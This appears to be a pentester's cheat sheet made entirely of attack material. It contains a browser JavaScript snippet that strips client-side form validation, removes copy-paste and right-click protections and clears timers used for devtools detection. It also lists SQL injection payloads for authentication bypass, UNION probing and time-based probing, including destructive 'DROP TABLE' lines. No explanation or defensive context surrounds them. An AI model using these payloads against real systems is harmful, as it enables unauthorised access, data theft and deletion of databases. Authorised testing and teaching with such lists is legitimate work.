# Pentesting

## Attack

### Utils

#### 1 Disable validation

```js
// Config
{
    // disable built-in validation
    HTMLInputElement.prototype.checkValidity = () => true;
    HTMLFormElement.prototype.checkValidity = () => true;
    HTMLTextAreaElement.prototype.checkValidity = () => true;
    HTMLSelectElement.prototype.checkValidity = () => true;


    // remove attribute validation
    document.querySelectorAll("*").forEach(element => {
        element.removeAttribute("required");
        element.removeAttribute("minlength");
        element.removeAttribute("maxlength");
        element.removeAttribute("pattern");
        element.removeAttribute("min");
        element.removeAttribute("max");
        element.removeAttribute("step");
        element.removeAttribute("disabled");
        element.removeAttribute("type");
    });


    // change input type = text;
    document.querySelectorAll("input").forEach(input => {
        input.type = "text";
    });


    // override custom validation messages
    document.querySelectorAll("input, textarea, select").forEach(element => {
        element.setCustomValidity("");
    });

    // remove event validation
    document.querySelectorAll("input, textarea, select, form").forEach(element => {
        element.oninput = null;
        element.onchange = null;
        element.onblur = null;
        element.onsubmit = null;
    });

    // stop java script from blocking submission
    document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", function(event) {
            // prevent listener 
            event.stopPropagation();
        }, true);
    });

    // disable copy paste protection
    document.oncopy = null;
    document.onpaste = null;

    // disable right click protection by removing custom context
    document.oncontextmenu = null;

    // disable validation for all the form
    const forms = document.querySelectorAll("form");    
    forms.forEach(form => {
        form.noValidate = true;
    });


    {
        window.outerWidth = window.innerWidth;
        for (let i = 0; i < 10000; i++) {
            clearInterval(i);
        }
    }

    console.log("Client-site validation disabled \^w^/");
}
```
### 2 Manual

#### SQL Injection 

```
' OR SLEEP(5) --
' OR 1=1 --
" OR "1"="1"
admin'--
admin' --
'; DROP TABLE users;--
'; DROP TABLE usuario;--
' UNION SELECT 1,2,3--
' UNION SELECT NULL, NULL --
' OR 'x'='x
admin'/*
' AND 1=1 --
' AND 1=2 --
1 OR 1=1--
1 OR 1=1
```
